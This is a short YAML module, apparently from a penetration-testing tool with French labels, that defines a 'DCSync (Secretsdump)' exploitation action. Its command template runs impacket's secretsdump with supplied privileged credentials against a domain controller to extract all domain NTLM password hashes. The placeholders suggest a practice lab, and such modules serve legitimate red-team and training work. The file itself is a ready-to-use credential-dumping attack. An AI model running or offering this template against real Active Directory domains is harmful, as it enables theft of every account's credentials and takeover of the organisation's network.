id: impacket_dcsync
name: DCSync (Secretsdump)
category: Exploitation
description: "Récupère les hashs NTLM du domaine via le protocole de réplication (DRSUAPI)."
inputs:
  - name: domain
    label: "Domaine"
    placeholder: north.sevenkingdoms.local
  - name: dc_ip
    label: "IP du DC"
    placeholder: 10.3.10.11
  - name: username
    label: Utilisateur (Privilégié)
    placeholder: administrator
  - name: password
    label: Mot de passe
    placeholder: password

command: "secretsdump '{{domain}}/{{username}}:{{password}}@{{dc_ip}}' -just-dc-ntlm"